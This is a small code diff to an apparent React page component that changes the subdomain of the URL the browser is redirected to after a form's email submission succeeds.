@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://jy.loline-sps.shop';
+        window.location.href = 'https://jrry.loline-sps.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
